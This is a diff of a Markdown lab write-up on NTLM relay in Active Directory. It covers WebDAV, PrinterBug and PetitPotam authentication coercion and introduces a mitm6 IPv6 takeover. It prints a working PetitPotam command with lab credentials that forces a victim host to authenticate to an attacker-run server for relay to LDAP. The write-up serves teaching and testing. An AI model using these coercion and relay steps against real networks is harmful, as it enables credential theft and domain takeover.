@@ -149,20 +149,20 @@ For ease of this lab, the webclient service has been manually enabled with:
 ```
 start-service webclient
 ```
-Please note that if the webclient is installed but not running, there are some techniques that allow to enable the service, for example [placing a "Documents.searchConnector-ms” on a share](https://tradecraft.cafe/Windows-Search-And-WebDAV-Payloads/).
+Please note that if the webclient is installed but not running, there are some techniques that allow to enable the service, for example [placing a "Documents.searchConnector-ms” on a share](https://tradecraft.cafe/Windows-Search-And-WebDAV-Payloads/) (out of scope here).
 
-For our next step, how can we force an authentication over HTTP?
+For our next step, how can we force an authentication over HTTP? Please remember that one of the ways to have a successful relay to LDAP service is to "come from" HTTP, of which WebDAV is an extension.
 
-An attacker can try to coerce client authentication with RPC calls, by using some techniques that started to be relevant in 2018. The first issue to become widely used was called “PrinterBug”: it was an authenticated method (i.e., an attacker needs to already have domain credentials) for getting a server running the Print Spooler service to initiate an NTLMv2 authentication session (using its Machine Account credentials) with a server of the attacker's choosing. 
+An attacker can try to coerce client authentication by using RPC calls with some techniques that started to be relevant in 2018. The first issue to become widely used was called “PrinterBug”: it is an authenticated method (i.e., an attacker needs to already have domain credentials) for getting a server running the Print Spooler service to initiate an NTLMv2 authentication session (using its Machine Account credentials) with a server of the attacker's choosing. 
 
-In 2021, the PetitPotam tool was released, utilizing a similar vulnerability in the service MS-EFSRPC (Encrypting File System Remote Protocol). Please note that the researchers also found two vulnerabilites (CVE-2021-36943 AND CVE-2022-26925) that allowed unauthenticated coercion. This meant that an attacker without any credentials could force a vulnerable server to connect to the relay server. To make matters worse, Domain Controllers were vulnerable to the unauthenticated attack by default. As you can imagine, the un-authenticated version of the attack has been quickly patched, but still this kind of attack is quite relevant in the authenticated flavour.
+In 2021, the PetitPotam tool was released, utilizing a similar vulnerability in the service MS-EFSRPC (Encrypting File System Remote Protocol). Please note that the researchers also found two vulnerabilites (CVE-2021-36943 AND CVE-2022-26925) that allowed unauthenticated coercion. This meant that an attacker without any credentials could force a vulnerable server to connect to the relay server. To make things worse, Domain Controllers were vulnerable to the unauthenticated attack by default. As you can imagine, the un-authenticated version of the attack has been quickly patched, but still this kind of attack is quite relevant in the authenticated flavour.
 
-This is an example usage, let me describe the input parameters:
+What follows is an example usage; let me describe the input parameters:
 - the username ("victim"),
 - the domain
 - the known password,
-- the server to which initiate an NTLMv2 authentication session ("attacker@80/aaa")
-- the IP address of the victim to attack
+- the attacker-run http server to which initiate an NTLMv2 authentication session ("attacker@80/aaa") that will be relayed
+- the IP address of the victim to force to connect to the previous resource
 ```
 python3 PetitPotam.py -u victim -d ntlmlab.local -p Qwerty123 attacker@80/aaa 10.0.0.2
 ```
@@ -170,11 +170,8 @@ Please see the attached screenshot with two terminal windows side-by-side
 
 ![petitpotam](images/petitpotam.png)
 
-Historically, PetitPotam worked from an unauthenticated perspective, but this has been patched as in our demo environment, so both the coercion techniques presented need valid credentials to trigger an authentication over HTTP to the attacker machine what will finally relay to LDAP.
-Given this limitation, if we already have suitable credentials, we could just use another tool to directly connect to LDAP and dump data, like for example “ldapdomaindump”.
-
 ### Attack 2B mitm6
-The IPv6 takeover is more interesting, as we do not require any credentials for that type of attack. However, this attack can only be successfully performed if the organization we are targetting has IPv6 enabled, but not in use, which is quite common since in modern Windows operating systems, IPv6 is enabled by default and typically not used.
+The IPv6 takeover is more interesting, as we do not require any credentials for this type of attack. However, this attack can only be successfully performed if the organization we are targetting has IPv6 enabled, but not in use, which is quite common since in modern Windows operating systems, IPv6 is enabled by default and typically not used.
 This means that computers periodically poll for an IPv6 lease and, if found, they will immediately start to use it since IPv6 has precedence over IPv4.
 
 Let's start mitm6 on our attacker computer: 
